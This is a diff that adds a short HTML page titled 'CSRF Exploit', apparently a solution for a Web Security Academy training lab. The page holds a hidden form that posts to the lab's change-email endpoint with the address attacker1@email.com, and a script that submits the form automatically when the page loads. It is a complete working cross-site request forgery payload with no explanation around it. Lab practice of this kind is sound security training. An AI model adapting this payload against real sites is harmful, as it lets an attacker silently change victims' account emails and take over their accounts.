@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+  <head><title>CSRF Exploit</title></head>
+  <body>
+    <h1>CSRF Exploit</h1>
+    <form action="https://0a0b009c03355ece803abc7800000042.web-security-academy.net/my-account/change-email"
+          method="POST" id="csrf-form">
+      <input type="hidden" name="email" value="attacker1@email.com">
+    </form>
+    <script>
+      document.getElementById('csrf-form').submit();
+    </script>
+  </body>
+</html>
